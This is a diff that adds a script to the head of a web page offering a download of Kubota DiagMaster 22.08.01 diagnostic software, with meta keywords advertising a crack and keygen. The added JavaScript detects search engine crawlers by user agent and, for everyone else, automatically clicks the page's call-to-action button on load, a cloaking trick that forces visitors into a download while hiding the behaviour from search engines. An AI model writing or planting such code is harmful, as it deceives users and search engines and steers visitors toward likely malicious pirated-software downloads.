@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kubota DiagMaster 22.08.01 level 9 Engineering 2022</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Kubota DiagMaster 22.08.01 Level 9 Engineering 2022 - advanced diagnostic software with extensive features for vehicle ECU trouble shooting">
     <meta name="keywords" content="Kubota DiagMaster, Kubota DiagMaster 22.08.01, Kubota DiagMaster level 9, Kubota DiagMaster 2022, Kubota diagnostic software, Kubota DiagMaster download, Kubota DiagMaster free download, Kubota DiagMaster crack, Kubota DiagMaster keygen, Kubota DiagMaster diagnostic software, Kubota DiagMaster diagnostic software download, Kubota DiagMaster diagnostic software free, Kubota DiagMaster 2022 download, Kubota software 22.08.01, Kubota engineering software, Kubota diagnostic keygen 2022, Kubota diagnostic software crack, Kubota engineering software free, Kubota engineering software download, Kubota engineering software free download, Kubota DiagMaster functions, Kubota vehicle ECU diagnostic, Kubota data recording, Kubota trouble shooting, Kubota ECU memory reset, Kubota active tests, Kubota injector compensation">
     <style>
